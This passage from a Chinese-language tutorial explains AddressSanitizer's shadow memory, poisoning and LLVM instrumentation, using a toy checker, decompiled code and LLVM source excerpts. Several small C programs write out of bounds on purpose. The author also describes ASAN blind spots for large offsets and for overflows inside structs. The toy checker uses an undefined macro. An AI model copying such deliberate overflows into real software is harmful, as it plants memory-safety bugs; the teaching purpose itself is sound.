0x7fffffffdfba:	0x00	0x00	0x00	0x00	0x00	0x00	0xa0	0x11
(gdb) n
12	    printf(&quot;Oops \n&quot;);
(gdb) x /16x buffer
0x7fffffffdfb2:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x7fffffffdfba:	0x00	0x00	0x43	0x00	0x00	0x00	0xa0	0x11
(gdb)
</code></pre>
<p>可以看到这里已经越界写数据成功了.一般地,我们要检测越界读写问题时,就需要专门创建一块内存用来做越界对比.下面的示例代码将引入检测逻辑:</p>
<pre><code class="language-c">#include &lt;memory.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

#define CHECK_MEMORY_LEFT_SIZE   (0x8)
#define CHECK_MEMORY_RIGHT_SIZE  (0x8)
#define CHECK_MEMORY_NORMAL_FLAG (0x00)
#define CHECK_MEMORY_EXCEPT_FLAG (0xFF)


void* create_check_memory(int buffer_size) {  // 创建内存映射,并且给这块映射内存两则边缘
    int real_buffer_size =
        CHECK_MEMORY_LEFT_SIZE + CHECK_MEMORY_RIGHT_SIZE + buffer_size;
    char* buffer = malloc(real_buffer_size);

    memset(buffer,CHECK_MEMORY_EXCEPT_FLAG,real_buffer_size);  // 填充异常Flag
    memset(&amp;buffer[CHECK_MEMORY_LEFT_SIZE],CHECK_MEMORY_NORMAL_FLAG,buffer_size);  // 内存中标识为正常值则说明这块区域是可以任意操作的

    return buffer;
}

void free_check_memory(void* buffer,int buffer_size) {  // 释放内存
    memset(buffer,CHECK_MEMORY_FREE_FLAG,
        CHECK_MEMORY_LEFT_SIZE + CHECK_MEMORY_RIGHT_SIZE + buffer_size);  // 不要free()释放,而是填充异常Flag,后续如果遇到UAF类漏洞就可以检测到
}

int is_overflow(void* buffer,int offset,int is_write) {  // 检测内存异常
    unsigned char data = ((unsigned char*)buffer)[CHECK_MEMORY_LEFT_SIZE + offset];

    if (CHECK_MEMORY_NORMAL_FLAG != data) {
        switch (data) {
            case CHECK_MEMORY_EXCEPT_FLAG:
                if (is_write)
                    printf(&quot; ==== Write OverFlow !! ====\n&quot;);
                else
                    printf(&quot; ==== Read OverFlow !! ====\n&quot;);

                break;
            case CHECK_MEMORY_FREE_FLAG:
                printf(&quot; ==== Use After Free !! ====\n&quot;);

                break;
            default:
                printf(&quot;Unknow Except\n&quot;);
        }
        exit(0);
    }
    return 0;
}

int main() {
    char buffer[10] = {0};
    char* shadow_buffer = create_check_memory(sizeof(buffer));  // 为buffer变量创建检测映射内存

    if (is_overflow(shadow_buffer,5,0))  // 向真实内存中写入数据之前先到检测内存中判断是否有异常
        exit(0);

    int data = buffer[5];  // 正常的读操作
    printf(&quot;Try Crash!\n&quot;);

    if (is_overflow(shadow_buffer,10,1))
        exit(0);

    buffer[10] = 'C';  // 异常的写操作
    printf(&quot;Oops \n&quot;);
    free_check_memory(shadow_buffer,sizeof(buffer));

    return 1;
}
</code></pre>
<p>运行结果如下:</p>
<pre><code class="language-sh">ubuntu@ubuntu-virtual-machine:~/Desktop/instrument_note$ clang -g ./test_case_2.c -o ./test_case_2 &amp;&amp; ./test_case_2
Try Crash!
 ==== Write OverFlow !! ====
ubuntu@ubuntu-virtual-machine:~/Desktop/instrument_note$
</code></pre>
<p>这短短几十行代码就是ASAN异常检测的核心原理,它包含了:</p>
<ul>
<li>
<p>每个缓冲区中对应的异常检测内存,对应的是ASAN的Shadow Table概念.</p>
</li>
<li>
<p>每个异常检测内存中都会插入正常/异常标识,对应的是ASAN的投毒(Poison)概念.</p>
</li>
<li>
<p>每次进行真实内存操作之前必须获取异常检测内存的内容,判断该地址是否被投毒过,对应的是ASAN的插桩检测概念.</p>
<p>聪明的读者可能会提出这个疑问:因为在异常检测内存的左边和右边八字节范围的内存被污染过,如果读写的偏移足够大,是不是检测逻辑就失效了呢?很遗憾,确实会存在这样的问题.</p>
</li>
</ul>
<pre><code class="language-text">(gdb) x /8x buffer
0x4052a0:	0xffffffff	0xffffffff	0x00000000	0x00000000
0x4052b0:	0xffff0000	0xffffffff	0x0000ffff	0x00000000
</code></pre>
<p>笔者在现实场景中遇到ASAN也存在这样的问题.</p>
<pre><code class="language-c">#include &lt;stdio.h&gt;

int main(void) {
    char buffer[10] = {0};

    printf(&quot;no crash!\n&quot;);
    buffer[0x1001] = 0xFF;

    printf(&quot;crash!\n&quot;);
    buffer[10] = 0xFF;

    return 0;
}
</code></pre>
<pre><code class="language-sh">ubuntu@ubuntu-virtual-machine:~/Desktop/instrument_note$ clang -g -fsanitize=address ./test_case_3.c -o ./test_case_3 &amp;&amp; ./test_case_3
no crash!
crash!
=================================================================
==521485==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7fffb261710a at pc 0x0000004c50f9 bp 0x7fffb26170d0 sp 0x7fffb26170c8
WRITE of size 1 at 0x7fffb261710a thread T0
    #0 0x4c50f8 in main /home/ubuntu/Desktop/instrument_note/./test_case_3.c:12:16
    #1 0x7f54faa5dcb1 in __libc_start_main csu/../csu/libc-start.c:314:16
    #2 0x41b2bd in _start (/home/ubuntu/Desktop/instrument_note/test_case_3+0x41b2bd)

Address 0x7fffb261710a is located in stack of thread T0 at offset 42 in frame
    #0 0x4c4f5f in main /home/ubuntu/Desktop/instrument_note/./test_case_3.c:5

...
</code></pre>
<p>理解核心原理之后,接下来就探索LLVM怎么样实现ASAN.在深入ASAN实现之前,我们必须要知道的一点就是:ASAN分为两部分,插桩(Instrumentation Pass)和运行时逻辑(Compiler-RT).</p>
<p>代码插桩负责:</p>
<ul>
<li>
<p>在代码中符合条件的数据操作之前插入异常检测逻辑.</p>
</li>
<li>
<p>引入对全局/栈空间的检测逻辑.</p>
<p>运行时逻辑负责:</p>
</li>
<li>
<p>内存分配/投毒逻辑</p>
</li>
<li>
<p>内存操作hook</p>
</li>
<li>
<p>...</p>
<p>明白这些概念之后,直接逆向简单的ASAN插桩后的程序,代码如下:</p>
</li>
</ul>
<pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp){
  if ( _asan_option_detect_stack_use_after_return )
    v24 = (_QWORD *)_asan_stack_malloc_3(0LL, (__asan *)0x180);
  stack_point = v24;
  if ( !v24 )
    stack_point = (_QWORD *)((unsigned __int64)(&amp;v11 - 48) &amp; 0xFFFFFFFFFFFFFFE0LL);
  stack_point_ = (unsigned __int64)stack_point;
  v25 = stack_point;
  *stack_point = 0x41B58AB3LL;                  // 填充栈开始Magic Code
  *(_QWORD *)(stack_point_ + 8) = &quot;1 32 272 4 test&quot;;
  *(_QWORD *)(stack_point_ + 0x10) = main;
  shadow_memory = stack_point_ &gt;&gt; 3;
  *(_QWORD *)(shadow_memory + 0x7FFF8000) = 0xF8F8F8F8F1F1F1F1LL; // 对ShadowTable中分配的栈内存进行投毒
  *(_QWORD *)(shadow_memory + 0x7FFF8008) = 0xF8F8F8F8F8F8F8F8LL;
  *(_QWORD *)(shadow_memory + 0x7FFF8010) = 0xF8F8F8F8F8F8F8F8LL;
  *(_QWORD *)(shadow_memory + 0x7FFF8018) = 0xF8F8F8F8F8F8F8F8LL;
  *(_QWORD *)(shadow_memory + 0x7FFF8020) = 0xF3F3F8F8F8F8F8F8LL;
  *(_QWORD *)(shadow_memory + 0x7FFF8028) = 0xF3F3F3F3F3F3F3F3LL;
  v26 = 0;
  *(_QWORD *)(shadow_memory + 0x7FFF8004) = 0LL; // 初始化可用栈区域
  *(_QWORD *)(shadow_memory + 0x7FFF800C) = 0LL;
  *(_QWORD *)(shadow_memory + 0x7FFF8014) = 0LL;
  *(_QWORD *)(shadow_memory + 0x7FFF801C) = 0LL;
  *(_WORD *)(shadow_memory + 0x7FFF8024) = 0;
  v7 = *(_BYTE *)(((unsigned __int64)(real_data_ + 0x22) &gt;&gt; 3) + 0x7FFF8000);
  v13 = (unsigned __int64)(real_data_ + 0x22);  // 计算偏移,获取到ShadowTable中的内存
  v12 = v7;
  if ( v7 )  // ASAN内存异常检测插桩判断,内存中是0值表示为正常内存,可以使用,如果为非0值那就认为是被污染过的
    _asan_report_store1(v13);  // 提示报错
  *(_BYTE *)v13 = -1;  // 写入真实内存,注意,ShadowTable中的数据全部都是标识这块内存是否被污染过,用了什么方式污染,并不会保存真实的数据到ShadowTable中,所以它才被称为影子页表.
  v8 = v21;
  *(_QWORD *)((char *)v21 + 4) = 0xF8F8F8F8F8F8F8F8LL;  // 释放栈时不是直接free(),而是填充Stack use after标志
  *(_QWORD *)((char *)v8 + 12) = 0xF8F8F8F8F8F8F8F8LL;
  *(_QWORD *)((char *)v8 + 20) = 0xF8F8F8F8F8F8F8F8LL;
  *(_QWORD *)((char *)v8 + 28) = 0xF8F8F8F8F8F8F8F8LL;
  *((_WORD *)v8 + 18) = -1800;

  return 0;
</code></pre>
<h4 id="编译时插桩原理-1"><a class="header" href="#编译时插桩原理-1">编译时插桩原理</a></h4>
<p>ASAN的插桩原理比SanitizerCoverage复杂得多,为了容易理解,后续分析实现过程时会省略很多细节.ASAN的插桩过程简单来说就是:</p>
<ol>
<li>筛选合适的指令</li>
<li>填充插桩代码</li>
<li>进行栈平衡</li>
</ol>
<p>整体的逻辑示意图如下,先理解过程之后再带着印象去探索源码才能事半功倍:</p>
<p><img src="12.libfuzzer-asan/%E6%B7%B1%E5%85%A5%E8%A7%A3%E6%9E%90libfuzzer%E4%B8%8Easan/C:%5CUsers%5CFremy%5CDesktop%5Cvm%5Cinstrument%5Cpic12%5CAsan-Arch.png" alt="" /></p>
<p>ASAN的实现代码在\llvm-project\llvm\lib\Transforms\Instrumentation\AddressSanitizer.cpp.遍历每个函数进行插桩的入口点在<code>AddressSanitizer::instrumentFunction()</code>函数.</p>
<pre><code class="language-c++">bool AddressSanitizer::instrumentFunction(Function &amp;F,const TargetLibraryInfo *TLI) {
  // 省略代码
  SmallVector&lt;InterestingMemoryOperand, 16&gt; OperandsToInstrument;
  SmallVector&lt;MemIntrinsic *, 16&gt; IntrinToInstrument;
  SmallVector&lt;BasicBlock *, 16&gt; AllBlocks;
  int NumAllocas = 0;
  // 这些Vector用于保存筛选出来的指令对象和信息

  for (auto &amp;BB : F) {  // 遍历BasicBlock
    AllBlocks.push_back(&amp;BB);
    for (auto &amp;Inst : BB) {  // 遍历指令
      SmallVector&lt;InterestingMemoryOperand, 1&gt; InterestingOperands;
      getInterestingMemoryOperands(&amp;Inst, InterestingOperands);

      if (!InterestingOperands.empty()) {  // 如果当前指令属于需要插桩的位置,那就记录一下,后面会用到
        for (auto &amp;Operand : InterestingOperands) {
          OperandsToInstrument.push_back(Operand);
        }
      } else if (MemIntrinsic *MI = dyn_cast&lt;MemIntrinsic&gt;(&amp;Inst)) {  // memset/memcpy/memmove操作
        IntrinToInstrument.push_back(MI);
      }
    }
  }

  // ...

  for (auto &amp;Operand : OperandsToInstrument) {  // 对数据访问指令进行操作
    instrumentMop(ObjSizeVis, Operand, UseCalls,
                    F.getParent()-&gt;getDataLayout());
    FunctionModified = true;
  }
  for (auto Inst : IntrinToInstrument) {  // 对内存操作指令进行操作
    instrumentMemIntrinsic(Inst);
    FunctionModified = true;
  }

  FunctionStackPoisoner FSP(F, *this);
  bool ChangedStack = FSP.runOnFunction();  // 对插桩之后的函数进行栈调整

  // ...

  return FunctionModified;
}

void AddressSanitizer::getInterestingMemoryOperands(
    Instruction *I, SmallVectorImpl&lt;InterestingMemoryOperand&gt; &amp;Interesting) {
  if (LoadInst *LI = dyn_cast&lt;LoadInst&gt;(I)) {  // LLVM IR Load指令,用于读取数据
    if (ignoreAccess(LI-&gt;getPointerOperand()))  // 判断指令中的操作数是否为指针
      return;
    Interesting.emplace_back(I, LI-&gt;getPointerOperandIndex(), false,
                             LI-&gt;getType(), LI-&gt;getAlign());
  } else if (StoreInst *SI = dyn_cast&lt;StoreInst&gt;(I)) {  // LLVM IR Store指令,用于保存数据
    if (ignoreAccess(SI-&gt;getPointerOperand()))
      return;
    Interesting.emplace_back(I, SI-&gt;getPointerOperandIndex(), true,
                             SI-&gt;getValueOperand()-&gt;getType(), SI-&gt;getAlign());
  }
}
</code></pre>
<p>获得筛选出来的指令后,接下来就进行插桩操作.下面的插桩核心原理,就是在<strong>Load/Store</strong>指令前面插入异常检测逻辑,如果没有异常才可以执行真实的数据读写操作.</p>
<pre><code class="language-c++">void AddressSanitizer::instrumentMop(ObjectSizeOffsetVisitor &amp;ObjSizeVis,InterestingMemoryOperand &amp;O, bool UseCalls,const DataLayout &amp;DL) {
  Value *Addr = O.getPtr();  // 获取指令操作的指针地址

   // ...

  unsigned Granularity = 1 &lt;&lt; Mapping.Scale;  // 内存检测粒度,后续再详解

  doInstrumentAddress(this, O.getInsn(), O.getInsn(), Addr, O.Alignment,
                  Granularity, O.TypeSize, O.IsWrite, nullptr, UseCalls,
                  Exp);
}

static void doInstrumentAddress(AddressSanitizer *Pass, Instruction *I,
                                Instruction *InsertBefore, Value *Addr,
                                MaybeAlign Alignment, unsigned Granularity,
                                uint32_t TypeSize, bool IsWrite,
                                Value *SizeArgument, bool UseCalls,
                                uint32_t Exp) {
  if ((TypeSize == 8 || TypeSize == 16 || TypeSize == 32 || TypeSize == 64 ||
       TypeSize == 128) &amp;&amp;
      (!Alignment || *Alignment &gt;= Granularity || *Alignment &gt;= TypeSize / 8))
    return Pass-&gt;instrumentAddress(I, InsertBefore, Addr, TypeSize, IsWrite,
                                   nullptr, UseCalls, Exp);  // 如果当前指令的访问方式是按字节大小访问的话(char,short,long,uint64_t这些方式)
  Pass-&gt;instrumentUnusualSizeOrAlignment(I, InsertBefore, Addr, TypeSize,
                                         IsWrite, nullptr, UseCalls, Exp);
}

void AddressSanitizer::instrumentAddress(Instruction *OrigIns,Instruction *InsertBefore, Value *Addr,uint32_t TypeSize, bool IsWrite,Value *SizeArgument, bool UseCalls,uint32_t Exp) {
  bool IsMyriad = TargetTriple.getVendor() == llvm::Triple::Myriad;

  IRBuilder&lt;&gt; IRB(InsertBefore);  // LLVM IR指令生成器
  Value *AddrLong = IRB.CreatePointerCast(Addr, IntptrTy);
  size_t AccessSizeIndex = TypeSizeToSizeIndex(TypeSize);

  Type *ShadowTy =
      IntegerType::get(*C, std::max(8U, TypeSize &gt;&gt; Mapping.Scale));
  Type *ShadowPtrTy = PointerType::get(ShadowTy, 0);
  Value *ShadowPtr = memToShadow(AddrLong, IRB);
  Value *CmpVal = Constant::getNullValue(ShadowTy);
  Value *ShadowValue =
      IRB.CreateLoad(ShadowTy, IRB.CreateIntToPtr(ShadowPtr, ShadowPtrTy));

  Value *Cmp = IRB.CreateICmpNE(ShadowValue, CmpVal);
  Instruction *CrashTerm = nullptr;

   /*
   上面这段指令生成的意思是创建if判断:
  shadow_page_flag = *(_BYTE *)((((unsigned __int64)real_data + 0x1001) &gt;&gt; 3) + 0x7FFF8000);
  real_data_offset = (unsigned __int64)real_data + 0x1001;
   if ( shadow_page_flag )  // ASAN内存异常检测插桩判断
   */

  CrashTerm = SplitBlockAndInsertIfThen(Cmp, InsertBefore, !Recover);
  Instruction *Crash = generateCrashCode(CrashTerm, AddrLong, IsWrite, AccessSizeIndex, SizeArgument, Exp);

   /*
   上面这段指令生成的意思是if判断成功时,在它的子BasicBlock中创建函数调用:
    _asan_report_store1(v13);  // 提示报错

   所以合并起来插桩代码就是:
  shadow_page_flag = *(_BYTE *)((((unsigned __int64)real_data + 0x1001) &gt;&gt; 3) + 0x7FFF8000);
  real_data_offset = (unsigned __int64)real_data + 0x1001;
   if ( shadow_page_flag )  // ASAN内存异常检测插桩判断
    _asan_report_store1(real_data_offset);  // 提示报错
   */
}
</code></pre>
<p>对所有关键位置进行插入了异常判断后,最后一步就是调整函数的栈空间,把ShadowTable的分配和销毁引入进来.</p>
<pre><code class="language-c++">bool AddressSanitizer::instrumentFunction() {
   // ...
   FunctionStackPoisoner FSP(F, *this);
   bool ChangedStack = FSP.runOnFunction();
   // ...
}

bool runOnFunction() {
   // ...
   // 遍历函数中所有指令,筛选出内存分配操作
   for (BasicBlock *BB : depth_first(&amp;F.getEntryBlock())) visit(*BB);
   // ...
   processDynamicAllocas();
   processStaticAllocas();
   // ...

   return true;
}

void visitAllocaInst(AllocaInst &amp;AI) {  // 遍历指令时遇到AllocaInst,它的意义是在栈内分配指定大小内存
  if (!AI.isStaticAlloca())  // 只要在当前函数声明的变量,无论在if/switch/while/for里面哪个BasicBlock,编译时都会把这块内存的申请放到函数的入口BasicBlock中.isStaticAlloca的用意就在于判断这个AllocInst是否在当前函数的入口BasicBlock中执行,而且还判断AllocInst创建的内存大小的值是否会变而不是指定的大小.
    DynamicAllocaVec.push_back(&amp;AI);
  else
    AllocaVec.push_back(&amp;AI);
}

void visitIntrinsicInst(IntrinsicInst &amp;II) {
  bool DoPoison = (ID == Intrinsic::lifetime_end);
  AllocaPoisonCall APC = {&amp;II, AI, SizeValue, DoPoison};
  if (AI-&gt;isStaticAlloca())  // 同上
    StaticAllocaPoisonCallVec.push_back(APC);  // 记录栈中分配对象大小和偏移信息
  else if (ClInstrumentDynamicAllocas)
    DynamicAllocaPoisonCallVec.push_back(APC);
}
</code></pre>
<p><code>processDynamicAllocas()</code>的逻辑就不深入探索了,我们主要研究的是<code>processStaticAllocas()</code>函数的实现.</p>
<pre><code class="language-c++">void FunctionStackPoisoner::processStaticAllocas() {
  // ...
  Instruction *InsBefore = AllocaVec[0];
  IRBuilder&lt;&gt; IRB(InsBefore);  // 在函数的第一个AllocaInst指令前插入新代码

  SmallVector&lt;ASanStackVariableDescription, 16&gt; SVD;
  SVD.reserve(AllocaVec.size());
  for (AllocaInst *AI : AllocaVec) {  // 遍历所有在函数入口点声明的AllocaInst指令,收集这些AllocaInst指令的信息
    ASanStackVariableDescription D = {AI-&gt;getName().data(),
                                      ASan.getAllocaSizeInBytes(*AI),
                                      0,
                                      AI-&gt;getAlignment(),
                                      AI,
                                      0,
                                      0};
    SVD.push_back(D);
  }

  size_t Granularity = 1ULL &lt;&lt; Mapping.Scale;  // 内存粒度,后面再具体说明
  size_t MinHeaderSize = std::max((size_t)ASan.LongSize / 2, Granularity);
  const ASanStackFrameLayout &amp;L =
      ComputeASanStackFrameLayout(SVD, Granularity, MinHeaderSize);  // 调整ASAN插桩后的整个栈布局
  uint64_t LocalStackSize = L.FrameSize;  // 获取调整之后的栈布局大小

  Value *StaticAlloca =
      DoDynamicAlloca ? nullptr : createAllocaForLayout(IRB, L, false);  // 调整新栈空间,这块栈内存是真实使用的
  Value *FakeStack;
  Value *LocalStackBase;
  Value *LocalStackBaseAlloca;
  uint8_t DIExprFlags = DIExpression::ApplyOffset;

  LocalStackBaseAlloca =
      IRB.CreateAlloca(IntptrTy, nullptr, &quot;asan_local_stack_base&quot;);
  Constant *OptionDetectUseAfterReturn = F.getParent()-&gt;getOrInsertGlobal(
      kAsanOptionDetectUseAfterReturn, IRB.getInt32Ty());
  Value *UseAfterReturnIsEnabled = IRB.CreateICmpNE(
      IRB.CreateLoad(IRB.getInt32Ty(), OptionDetectUseAfterReturn),
      Constant::getNullValue(IRB.getInt32Ty()));
  Instruction *Term =
      SplitBlockAndInsertIfThen(UseAfterReturnIsEnabled, InsBefore, false);
  IRBuilder&lt;&gt; IRBIf(Term);
  StackMallocIdx = StackMallocSizeClass(LocalStackSize);
  assert(StackMallocIdx &lt;= kMaxAsanStackMallocSizeClass);
  Value *FakeStackValue =
      IRBIf.CreateCall(AsanStackMallocFunc[StackMallocIdx],
                       ConstantInt::get(IntptrTy, LocalStackSize));
  IRB.SetInsertPoint(InsBefore);
  FakeStack = createPHI(IRB, UseAfterReturnIsEnabled, FakeStackValue, Term,
                        ConstantInt::get(IntptrTy, 0));

  Value *NoFakeStack =
      IRB.CreateICmpEQ(FakeStack, Constant::getNullValue(IntptrTy));
  Term = SplitBlockAndInsertIfThen(NoFakeStack, InsBefore, false);
  IRBIf.SetInsertPoint(Term);
  Value *AllocaValue =
      DoDynamicAlloca ? createAllocaForLayout(IRBIf, L, true) : StaticAlloca;

  IRB.SetInsertPoint(InsBefore);
  LocalStackBase = createPHI(IRB, NoFakeStack, AllocaValue, Term, FakeStack);
  IRB.CreateStore(LocalStackBase, LocalStackBaseAlloca);
  // 生成的插桩代码等价于:
  // void *FakeStack = __asan_option_detect_stack_use_after_return
  //     ? __asan_stack_malloc_N(LocalStackSize)
  //     : nullptr;
  // void *LocalStackBase = (FakeStack) ? FakeStack : alloca(LocalStackSize);
  // 意思是从ShadowTable中分配一块栈内存,这块栈内存是用于异常检测的.__asan_stack_malloc_N()的实现代码在Compiler-RT.

  Value *LocalStackBaseAllocaPtr =
      isa&lt;PtrToIntInst&gt;(LocalStackBaseAlloca)
          ? cast&lt;PtrToIntInst&gt;(LocalStackBaseAlloca)-&gt;getPointerOperand()
          : LocalStackBaseAlloca;  // 获取ShadowTable中的栈起始地址

  for (const auto &amp;Desc : SVD) {  // 根据AllocaInst的申请栈分配内存大小和位置,在ShadowTable中重新调整到对应的位置
    AllocaInst *AI = Desc.AI;
    Value *NewAllocaPtr = IRB.CreateIntToPtr(
        IRB.CreateAdd(LocalStackBase, ConstantInt::get(IntptrTy, Desc.Offset)),
        AI-&gt;getType());
    AI-&gt;replaceAllUsesWith(NewAllocaPtr);
  }

  // 这些插桩代码都不太重要,意义就是在ShadowTable中创建的栈内存记录当前函数的信息
  Value *BasePlus0 = IRB.CreateIntToPtr(LocalStackBase, IntptrPtrTy);
  IRB.CreateStore(ConstantInt::get(IntptrTy, kCurrentStackFrameMagic),
                  BasePlus0);
  // Write the frame description constant to redzone[1].
  Value *BasePlus1 = IRB.CreateIntToPtr(
      IRB.CreateAdd(LocalStackBase,
                    ConstantInt::get(IntptrTy, ASan.LongSize / 8)),
      IntptrPtrTy);
  GlobalVariable *StackDescriptionGlobal =
      createPrivateGlobalForString(*F.getParent(), DescriptionString,
                                   /*AllowMerging*/ true, kAsanGenPrefix);
  Value *Description = IRB.CreatePointerCast(StackDescriptionGlobal, IntptrTy);
  IRB.CreateStore(Description, BasePlus1);
  // Write the PC to redzone[2].
  Value *BasePlus2 = IRB.CreateIntToPtr(
      IRB.CreateAdd(LocalStackBase,
                    ConstantInt::get(IntptrTy, 2 * ASan.LongSize / 8)),
      IntptrPtrTy);
  IRB.CreateStore(IRB.CreatePointerCast(&amp;F, IntptrTy), BasePlus2);

  const auto &amp;ShadowAfterScope = GetShadowBytesAfterScope(SVD, L);  // 根据SVD中记录栈中各个变量对应的内存位置初始化ShadowTable的栈内存

  Value *ShadowBase = ASan.memToShadow(LocalStackBase, IRB);  // ASan.memToShadow()用于计算进程内存在ShadowTable的偏移位置
  copyToShadow(ShadowAfterScope, ShadowAfterScope, IRB, ShadowBase);  // 21给函数栈内存投毒

  if (!StaticAllocaPoisonCallVec.empty()) {  // 2.对栈中分配的变量在ShadowTable中消毒
    const auto &amp;ShadowInScope = GetShadowBytes(SVD, L);

    for (const auto &amp;APC : StaticAllocaPoisonCallVec) {
      const ASanStackVariableDescription &amp;Desc = *AllocaToSVDMap[APC.AI];
      assert(Desc.Offset % L.Granularity == 0);
      size_t Begin = Desc.Offset / L.Granularity;
      size_t End = Begin + (APC.Size + L.Granularity - 1) / L.Granularity;

      IRBuilder&lt;&gt; IRB(APC.InsBefore);
      copyToShadow(ShadowAfterScope,
                   APC.DoPoison ? ShadowAfterScope : ShadowInScope, Begin, End,
                   IRB, ShadowBase);
    }
  }
  /*
  投毒再消毒后,ShadowTable的内存数据布局如下:
  1.ShadowTable分配栈后对内存投毒 =&gt;  F3F3F8F8F1F1F1F1
  2.对栈中需要用到的变量位置消毒  =&gt;  F3F30000F1F1F1F1
  此时访问栈变量,获取到的数据就是0x00,为正常数据访问;如果是不允许访问的话,那就必定不为0
  */

  SmallVector&lt;uint8_t, 64&gt; ShadowClean(ShadowAfterScope.size(), 0);
  SmallVector&lt;uint8_t, 64&gt; ShadowAfterReturn;

  for (auto Ret : RetVec) {
    IRBuilder&lt;&gt; IRBRet(Ret);
    // Mark the current frame as retired.
    IRBRet.CreateStore(ConstantInt::get(IntptrTy, kRetiredStackFrameMagic),
                       BasePlus0);

    // 简单总结就是在函数返回时清空ShadowTable中的栈数据为0xF5
    // if FakeStack != 0  // LocalStackBase == FakeStack
    //     // In use-after-return mode, poison the whole stack frame.
    //     if StackMallocIdx &lt;= 4
    //         // For small sizes inline the whole thing:
    //         memset(ShadowBase, kAsanStackAfterReturnMagic, ShadowSize);
    //         **SavedFlagPtr(FakeStack) = 0
    //     else
    //         __asan_stack_free_N(FakeStack, LocalStackSize)
    // else
    //     &lt;This is not a fake stack; unpoison the redzones&gt;
    Value *Cmp =
        IRBRet.CreateICmpNE(FakeStack, Constant::getNullValue(IntptrTy));
    Instruction *ThenTerm, *ElseTerm;
    SplitBlockAndInsertIfThenElse(Cmp, Ret, &amp;ThenTerm, &amp;ElseTerm);

    IRBuilder&lt;&gt; IRBPoison(ThenTerm);
    if (StackMallocIdx &lt;= 4) {
      int ClassSize = kMinStackMallocSize &lt;&lt; StackMallocIdx;
      ShadowAfterReturn.resize(ClassSize / L.Granularity,
                               kAsanStackUseAfterReturnMagic);
      copyToShadow(ShadowAfterReturn, ShadowAfterReturn, IRBPoison,
                   ShadowBase);
      Value *SavedFlagPtrPtr = IRBPoison.CreateAdd(
          FakeStack,
          ConstantInt::get(IntptrTy, ClassSize - ASan.LongSize / 8));
      Value *SavedFlagPtr = IRBPoison.CreateLoad(
          IntptrTy, IRBPoison.CreateIntToPtr(SavedFlagPtrPtr, IntptrPtrTy));
      IRBPoison.CreateStore(
          Constant::getNullValue(IRBPoison.getInt8Ty()),
          IRBPoison.CreateIntToPtr(SavedFlagPtr, IRBPoison.getInt8PtrTy()));
    } else {
      // For larger frames call __asan_stack_free_*.
      IRBPoison.CreateCall(
          AsanStackFreeFunc[StackMallocIdx],
          {FakeStack, ConstantInt::get(IntptrTy, LocalStackSize)});
    }

    IRBuilder&lt;&gt; IRBElse(ElseTerm);
    copyToShadow(ShadowAfterScope, ShadowClean, IRBElse, ShadowBase);
  }
}
</code></pre>
<p>ASAN的实现中有大量的内存分配/操作功能,很显然,如果通过Pass模块把这些函数插入到Module会让Pass非常臃肿,所以ASAN把它的一些核心功能写在了Compiler-RT中,让Clang在链接阶段引入它们.</p>
<h4 id="llvm-compilerrt与asan内置函数-1"><a class="header" href="#llvm-compilerrt与asan内置函数-1">LLVM-CompilerRT与ASAN内置函数</a></h4>
<p>实际上,ASAN在程序运行main()之前就会执行初始化,ASAN把<code>asan_module_ctor()</code>函数地址写到.init_array区段,当程序启动时执行<code>__libc_csu_init()</code>函数时就会执行<code>asan_module_ctor()</code>初始化ASAN内部运行环境.</p>
<pre><code class="language-assembly">.init_array:00000000004F65D8 ; ELF Initialization Function Table
.init_array:00000000004F65D8 ; ===========================================================================
.init_array:00000000004F65D8
.init_array:00000000004F65D8 ; Segment type: Pure data
.init_array:00000000004F65D8 ; Segment permissions: Read/Write
.init_array:00000000004F65D8 ; Segment alignment 'qword' can not be represented in assembly
.init_array:00000000004F65D8 _init_array     segment para public 'DATA' use64
.init_array:00000000004F65D8                 assume cs:_init_array
.init_array:00000000004F65D8                 ;org 4F65D8h
.init_array:00000000004F65D8 __init_array_start dq offset asan_module_ctor  //  ASAN初始化函数
.init_array:00000000004F65D8                                         ; DATA XREF: __libc_csu_init+6↑o
.init_array:00000000004F65E0 __frame_dummy_init_array_entry dq offset frame_dummy
.init_array:00000000004F65E8                 dq offset _GLOBAL__sub_I_asan_rtl_cpp
.init_array:00000000004F65E8 _init_array     ends
.fini_array:00000000004F65F0 __init_array_end dq offset asan_module_dtor
</code></pre>
<p>接下来,<code>__asan_init()</code>就会初始化.代码目录在\llvm-project\compiler-rt\lib\asan\asan_activation.cpp.</p>
<pre><code class="language-c++">void __asan_init() {
  AsanActivate();
  AsanInitInternal();
}

void AsanActivate() {
  asan_deactivated_flags.OverrideFromActivationFlags();  // 从环境变量ASAN_ACTIVATION_OPTIONS中获取ASAN配置

  SetCanPoisonMemory(asan_deactivated_flags.poison_heap);
  SetMallocContextSize(asan_deactivated_flags.malloc_context_size);
  ReInitializeAllocator(asan_deactivated_flags.allocator_options);
}

static void AsanInitInternal() {
  InitializeHighMemEnd();
  InitializeShadowMemory();

  AllocatorOptions allocator_options;
  allocator_options.SetFrom(flags(), common_flags());
  InitializeAllocator(allocator_options);

  InitializeCoverage(common_flags()-&gt;coverage, common_flags()-&gt;coverage_dir);
}
</code></pre>
<p>这只是Compiler-RT ASAN功能的小部分,还有更多有趣的细节读者们可以自行探索.</p>
<h4 id="asan检测结构体的bug-1"><a class="header" href="#asan检测结构体的bug-1">ASAN检测结构体的Bug</a></h4>
<p>笔者在实际场景中发现了个这样问题:<strong>ASAN对结构体内的buffer溢出是不支持检测的</strong>.举个例子:</p>
<pre><code class="language-c">#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;

#define BUFFER_MAX (0x10)


typedef struct {
    int a;
    char buffer[BUFFER_MAX];
    int b;
    int c;
} no_check;

typedef struct {
    int a;
    char* buffer;
    int b;
    int c;
} check;


int main() {
    no_check test_obj1 = {0};
    check test_obj2 = {};

    printf(&quot;no crash!\n&quot;);
    test_obj1.buffer[BUFFER_MAX] = 0xFF;

    printf(&quot;crash!\n&quot;);
    test_obj2.buffer = malloc(BUFFER_MAX);
    test_obj2.buffer[BUFFER_MAX] = 0xFF;

    return 0;
}
</code></pre>
<pre><code class="language-sh">ubuntu@ubuntu-virtual-machine:~/Desktop/instrument_note$ clang -fsanitize=address ./test_case_6.c -o ./test_case_6 &amp;&amp; ./test_case_6
no crash!
crash!
=================================================================
==529347==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x602000000020 at pc 0x0000004c51f4 bp 0x7ffe84ee9fb0 sp 0x7ffe84ee9fa8
